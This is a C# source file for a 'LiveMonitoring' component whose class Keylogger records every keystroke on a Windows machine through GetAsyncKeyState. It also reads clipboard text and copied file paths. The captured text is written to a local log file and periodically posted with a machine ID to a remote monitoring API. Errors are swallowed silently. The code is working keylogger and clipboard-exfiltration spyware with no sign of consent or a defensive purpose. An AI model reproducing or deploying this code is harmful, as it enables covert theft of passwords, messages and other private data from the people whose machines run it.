using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using System.IO;
using System.Net.Http;
using System.Net.Http.Formatting;
using System.Drawing;

namespace LiveMonitoring
{

    public class Keylogger
    {
        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(Int32 i);

        public static string ClipboardOldText { get; set; }

        public static string KeyLoggerText { get; set; }

        static void Writelogfile()
        {
            // Create a writer and open the file:
            StreamWriter log;

            if (!File.Exists("logfile.txt"))
            {
                log = new StreamWriter("logfile.txt");
            }
            else
            {
                log = File.AppendText("logfile.txt");
            }

            // Write to the file:
            log.Write(DateTime.Now);
            log.WriteLine(KeyLoggerText);
            log.WriteLine();

            // Close the stream:
            log.Close();
        }

        public static void addKeyLoggerInfo(string LogText, string Type)
        {
            try
            {
                if (Type == "KL")
                {
                    Writelogfile();
                }
                if (LogText != "")
                {
                    using (HttpClient client = MachineInfoTracker.GetHttpClient())
                    {
                        KeyLogging model = new KeyLogging { MachineDetailId = Program.MachineId, Text = LogText, TextType = Type, CreatedDate = DateTime.Now };
                        HttpResponseMessage Response = client.PostAsync<KeyLogging>("api/LiveMonitoringAPI/AddKeyLoggings", model, new JsonMediaTypeFormatter()).Result;

                        if (Response.IsSuccessStatusCode == true)
                        {
                            var result = Response.Content.ReadAsStringAsync().Result;
                            if (result.Contains("OK"))
                            {
                                if (Type == "KL")
                                    KeyLoggerText = "";
                                Console.WriteLine("Record saved successfully.");
                            }
                            else if (result.Contains("Invalid"))
                            {
                                Program.AddMachineInfo();
                            }
                        }
                        else if (Response != null && Response.IsSuccessStatusCode == false)
                        {
                            var result = Response.Content.ReadAsStringAsync().Result;
                            Console.Write("Error Message - " + result);
                        }
                    }
                }
            }
            catch (Exception ex)
            {

            }
        }

        public static void FncKeyLogger()
        {
            try
            {
                System.Threading.Timer t = new System.Threading.Timer(TimerCallback, null, 0, Program.KeyLogger_MinTime);
                int capslock;
                if (Control.IsKeyLocked(Keys.CapsLock))
                    capslock = 1;
                else
                    capslock = 0;

                while (true)
                {
                    //sleeping for while, this will reduce load on cpu
                    Thread.Sleep(10);
                    for (Int32 i = 0; i < 255; i++)
                    {
                        int keyState = GetAsyncKeyState(i);
                        string strKeyName = Enum.GetName(typeof(Keys), i);
                        string description = GetDescription(strKeyName);

                        if (keyState == 1 || keyState == -32767)
                        {
                            // Console.Write(strKeyName);                       
                            if (strKeyName == "Enter")
                            {
                                Console.WriteLine();
                                KeyLoggerText += Environment.NewLine;
                                break;
                            }
                            else if (strKeyName == "Back")
                            {
                                Console.Write("\b");
                                KeyLoggerText = KeyLoggerText.Remove(KeyLoggerText.Length - 1);
                                break;
                            }
                            else
                            {
                                if (strKeyName == "CapsLock")
                                {
                                    description = "";
                                    capslock += 1;
                                }

                                if (Control.ModifierKeys != Keys.Shift && capslock % 2 == 0)
                                {
                                    string value = description.ToLower();
                                    if (value == "-")
                                        value = "_";
                                    else if (value == "+")
                                        value = "=";
                                    else if (value == "~")
                                        value = "`";
                                    else if (value == "|")
                                        value = "\\";
                                    else if (value == "num+")
                                        value = "+";
                                    else if (description == "?")
                                        value = "/";

                                    KeyLoggerText += value;
                                    Console.Write(value);
                                }
                                else
                                {
                                    if (capslock % 2 != 0)
                                    {
                                    }
                                    else
                                    {
                                        if (description == "1")
                                            description = "!";
                                        else if (description == "2")
                                            description = "@";
                                        else if (description == "3")
                                            description = "#";
                                        else if (description == "4")
                                            description = "$";
                                        else if (description == "5")
                                            description = "%";
                                        else if (description == "6")
                                            description = "^";
                                        else if (description == "7")
                                            description = "&";
                                        else if (description == "8")
                                            description = "*";
                                        else if (description == "9")
                                            description = "(";
                                        else if (description == "0")
                                            description = ")";
                                        else if (description == ",")
                                            description = "<";
                                        else if (description == ".")
                                            description = ">";
                                        else if (description == ";")
                                            description = ":";
                                        else if (description == "'")
                                            description = "\"";
                                        else if (description == "num+")
                                            description = "+";
                                        else if (description == "[")
                                            description = "{";
                                        else if (description == "]")
                                            description = "}";
                                    }

                                    Console.Write(description);
                                    KeyLoggerText += description;
                                }
                                break;
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {

            }

        }

        public static void FncClipboard()
        {
            try
            {
                string ClipboardText = GetClipboardText();
                if (ClipboardText != "" && ClipboardOldText != ClipboardText)
                {
                    ClipboardOldText = ClipboardText;
                    addKeyLoggerInfo(ClipboardText, "CB");
                }
            }
            catch (Exception ex)
            {

            }

        }

        public static string GetClipboardText()
        {
            string Result = string.Empty;
            try
            {

                Thread staThread = new Thread(x =>
                {
                    try
                    {
                        string ResultText = Clipboard.GetText();
                        IDataObject myDataObject = Clipboard.GetDataObject();
                        string[] files = (string[])myDataObject.GetData(DataFormats.FileDrop);

                        if (ResultText != "")
                        {
                            Result = ResultText;
                        }
                        else if (files != null)
                        {
                            for (int i = 0; i < files.Count(); i++)
                            {
                                Result = Result + files[i];
                                Result = Result + " | ";
                            }
                            Result = Result.Remove(Result.Length - 3);
                        }
                    }
                    catch (Exception ex)
                    {
                        Result = "";
                    }
                });
                staThread.SetApartmentState(ApartmentState.STA);
                staThread.Start();
                staThread.Join();

            }
            catch (Exception ex)
            {

            }
            return Result;
        }

        private static void TimerCallback(Object o)
        {
            try
            {
                addKeyLoggerInfo(KeyLoggerText, "KL");
                // Force a garbage collection to occur for this demo.
                GC.Collect();
            }
            catch (Exception ex)
            {

            }

        }

        public static string GetDescription(string strKey)
        {

            switch (strKey)
            {
                //letters
                case "A":
                case "B":
                case "C":
                case "D":
                case "E":
                case "F":
                case "G":
                case "H":
                case "I":
                case "J":
                case "K":
                case "L":
                case "M":
                case "N":
                case "O":
                case "P":
                case "Q":
                case "R":
                case "S":
                case "T":
                case "U":
                case "V":
                case "W":
                case "X":
                case "Y":
                case "Z":
                    return strKey;

                //digits
                case "D0":
                    return "0";
                case "NumPad0":
                    return "0";
                case "D1":
                    return "1";
                case "NumPad1":
                    return "1";
                case "D2":
                    return "2";
                case "NumPad2":
                    return "2";
                case "D3":
                    return "3";
                case "NumPad3":
                    return "3";
                case "D4":
                    return "4";
                case "NumPad4":
                    return "4";
                case "D5":
                    return "5";
                case "NumPad5":
                    return "5";
                case "D6":
                    return "6";
                case "NumPad6":
                    return "6";
                case "D7":
                    return "7";
                case "NumPad7":
                    return "7";
                case "D8":
                    return "8";
                case "NumPad8":
                    return "8";
                case "D9":
                    return "9";
                case "NumPad9":
                    return "9";

                //punctuation
                case "Add":
                    return "num+";
                case "Subtract":
                    return "-";
                case "Divide":
                    return "/";
                case "Multiply":
                    return "*";
                case "Space":
                    return " ";
                case "Decimal":
                    return ".";

                //function
                case "F1":
                case "F2":
                case "F3":
                case "F4":
                case "F5":
                case "F6":
                case "F7":
                case "F8":
                case "F9":
                case "F10":
                case "F11":
                case "F12":
                case "F13":
                case "F14":
                case "F15":
                case "F16":
                case "F17":
                case "F18":
                case "F19":
                case "F20":
                case "F21":
                case "F22":
                case "F23":
                case "F24":
                    return "";

                //navigation
                case "Up":
                    return "";
                case "Down":
                    return "";
                case "Left":
                    return "";
                case "Right":
                    return "";
                case "Prior":
                    return "";
                case "Next":
                    return "";
                case "Home":
                    return "";
                case "End":
                    return "";

                //control keys
                case "Back":
                    return "Back";
                case "Tab":
                    return "";
                case "Escape":
                    return "";
                case "Enter":
                    return "Enter";
                case "Shift":
                case "ShiftKey":
                    return "";
                case "LShiftKey":
                    return "";
                case "RShiftKey":
                    return "";
                case "Control":
                case "ControlKey":
                    return "";
                case "LControlKey":
                    return "";
                case "RControlKey":
                    return "";
                case "Menu":
                case "Alt":
                    return "";
                case "LMenu":
                    return "";
                case "RMenu":
                    return "";
                case "Pause":
                    return "";
                case "CapsLock":
                    return "CapsLock";
                case "NumLock":
                    return "";
                case "Scroll":
                    return "";
                case "PrintScreen":
                    return "";
                case "Insert":
                    return "";
                case "Delete":
                    return "";
                case "Help":
                    return "";
                case "LWin":
                    return "";
                case "RWin":
                    return "";
                case "Apps":
                    return "";

                //oem keys 
                case "OemSemicolon": //oem1
                    return ";";
                case "OemQuestion":
                case "Oem2":         //oem2
                    return "?";
                case "Oemtilde":     //oem3
                    return "~";
                case "OemOpenBrackets":
                case "Oem4":        //oem4
                    return "[";
                case "OemPipe":  //oem5
                    return "|";
                case "OemCloseBrackets":
                case "Oem6":         //oem6
                    return "]";
                case "OemQuotes":        //oem7
                    return "'";
                case "Oemplus":
                    return "+";
                case "OemMinus":
                    return "-";
                case "Oemcomma":
                    return ",";
                case "OemPeriod":
                    return ".";

                //unsupported oem keys
                case "Oem8":
                case "OemClear":
                    return "";

                default: return "";
            }
        }
    }
}
